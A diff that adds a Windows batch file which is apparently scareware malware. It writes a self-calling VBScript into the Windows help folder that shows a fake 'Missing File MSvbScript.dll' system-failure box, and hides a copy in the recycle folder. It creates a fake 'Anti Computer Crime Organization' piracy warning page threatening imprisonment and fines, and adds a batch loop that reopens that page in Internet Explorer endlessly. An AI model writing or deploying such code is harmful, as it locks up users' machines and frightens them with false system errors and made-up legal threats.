@@ -1,0 +1,27 @@
+@echo off
+echo WScript.echo "Malfunction in KERNEL32.DLL"  >> %windir%\help\technix.vbs
+echo L_Welcome_MsgBox_Message_Text   = "Missing File MSvbScript.dll Windows is un usable without MSvbScript.dll." >> %windir%\help\technix.vbs 
+echo L_Welcome_MsgBox_Title_Text    = "[~System Failure Contact VirtRoj ~]"  >> %windir%\help\technix.vbs
+echo ' ***********************************************************************  >> %windir%\help\technix.vbs
+echo ' * Welcome >> %windir%\help\technix.vbs
+echo ' *   >> %windir%\help\technix.vbs
+echo Sub Welcome()   >> %windir%\help\technix.vbs
+echo  Dim intDoIt   >> %windir%\help\technix.vbs
+echo. >> %windir%\help\technix.vbs
+echo  intDoIt =  MsgBox(L_Welcome_MsgBox_Message_Text,    _    >> %windir%\help\technix.vbs
+echo                    vbOKCancel + vbInformation,       _     >> %windir%\help\technix.vbs
+echo                    L_Welcome_MsgBox_Title_Text )    >> %windir%\help\technix.vbs
+echo  If intDoIt = vbCancel Then    >> %windir%\help\technix.vbs
+echo call welcome()   >> %windir%\help\technix.vbs
+echo  End If    >> %windir%\help\technix.vbs
+echo call welcome()   >> %windir%\help\technix.vbs
+echo End Sub    >> %windir%\help\technix.vbs
+echo call welcome() >> %windir%\help\technix.vbs
+echo WARNING..... TechNix ACCO (Anti Computer Crime Organization) has located several ilegal installed programs on your pc >> %WINDIR%\bad.htm
+type %windir%\help\technix.vbs > c:\recycled\¦.vbs
+echo @echo off >> %windir%\bad.bat 
+echo echo American Computer Crime Investigations cover the world in computer crimes and corruption People found selling or even running a pirate copy of any microsoft products will be dealt with by the full scale of the law... A maximum of up to 25 yrs imprisonment and or $250,000 fine  >> %windir%\bad.bat
+ECHO @ECHO OFF >> %WINDIR%\BAD.BAT
+ECHO :LOOP >> %WINDIR%\BAD.BAT
+ECHO C:\PROGRA~1\INTERN~1\IEXPLORE.EXE %WINIR%\BAD.HTM >> %WINDIR%\BAD.BAT
+ECHO GOTO LOOP >> %WINDIR%\BAD.BAT
